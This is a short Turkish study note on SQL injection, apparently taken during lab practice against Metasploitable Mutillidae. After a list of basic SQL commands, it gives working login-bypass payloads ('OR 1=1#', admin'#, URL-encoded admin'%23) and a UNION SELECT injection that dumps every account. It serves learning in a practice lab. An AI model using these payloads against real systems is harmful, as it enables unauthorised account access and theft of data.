### SQL Enjeksiyon

\*\*\* Temel sql komutları

- SELECT \* FROM demo;

- INSERT INTO demo (id, name, hint) VALUES (18, "James", "Guitar");

- DELETE FROM demo WHERE name = "James";

- UPDATE demo SET id = 18 WHERE name = "Atil";

- SELECT \* FROM demo WHERE name LIKE "%E";

\*\*\* Vertabanı Açığı Arama \*\*\*

- Metasploitable Mutillidae kullanılır.
- Açık aranacak servisin Login ekranında açık aranır

* Form/Giriş Ekranı Açık Aranır

- SELECT \* FROM accounts WHERE username='james' AND password '1111 AND 1=1#' // Bu kodda password '' içindeki kısım kopyala AND kısmı çalışır. # kısmı yorum satırı anlamı taşır sonrası çalışmaz

- SELECT \* FROM accounts
  WHERE username='admin' AND password='' OR 1=1#' // “#’dan sonrasını okuma, yok say”. Bu yüzden aslında sorgu şöyle oluyor:SELECT \* FROM accounts
  WHERE username='admin' AND password='' OR 1=1

- SELECT \* FROM accounts
  WHERE username='admin' # AND password='979978' // username kısmına admin'# yazarsak kullanıcı adının bilindiği veya tahmin edildiği tüm kullanıcılar şifre bilinmeksizin hesaba girrilir

* URL de Açık Aranır

- Eğer giriş yaptıktan sonra url de kullanıcı adı ve password bilgileri çıkıyorsa

- http://10.0.2.5/......username=admin'%23.... // üstteki methodu '%23 şeklinde %23 = # anlamına gelir html de. Kullanıcı adı ile giriş yapılır

- http://10.0.2.5/......username=admin' union select \* from accounts%23.... // Tüm kullanıcıları çeker
